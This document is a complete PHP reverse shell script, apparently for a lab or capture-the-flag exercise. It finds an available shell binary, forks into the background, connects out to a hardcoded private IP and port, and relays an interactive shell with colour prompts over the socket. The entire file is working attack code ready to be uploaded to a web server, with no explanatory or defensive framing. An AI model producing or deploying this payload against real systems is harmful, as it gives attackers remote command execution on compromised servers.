<?php
set_time_limit(0);
$ip = '10.9.2.51';
$port = 1234;
$chunk_size = 2048;
$daemon = 0;
$write_a = null;
$error_a = null;

$shells = ['/bin/bash', '/bin/sh', '/bin/zsh', '/bin/ksh', '/bin/dash', '/usr/bin/bash', '/usr/bin/sh'];
$shell_path = null;
foreach ($shells as $s) {
    if (is_executable($s)) {
        $shell_path = $s;
        break;
    }
}
if ($shell_path === null) $shell_path = '/bin/sh';

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) exit(1);
    if ($pid) exit(0);
    if (posix_setsid() == -1) exit(1);
    $daemon = 1;
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) exit(1);

# Setting environment variables for prompt colors and preventing command echo
$cmd = "script -q -c 'export TERM=xterm-256color; export LS_OPTIONS=\"--color=auto\"; export PS1=\"\\[\\033[01;36m\\]\\u@\\h:\\w\\$\\[\\033[00m\\] \"; $shell_path -i' /dev/null";

$descriptorspec = [
    0 => ["pipe", "r"],
    1 => ["pipe", "w"],
    2 => ["pipe", "w"]
];

$process = proc_open($cmd, $descriptorspec, $pipes);
if (!is_resource($process)) exit(1);

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
    if (feof($sock) || feof($pipes[1])) break;

    $read_a = [$sock, $pipes[1], $pipes[2]];
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

fclose($sock);
foreach ($pipes as $pipe) fclose($pipe);
proc_close($process);
?>

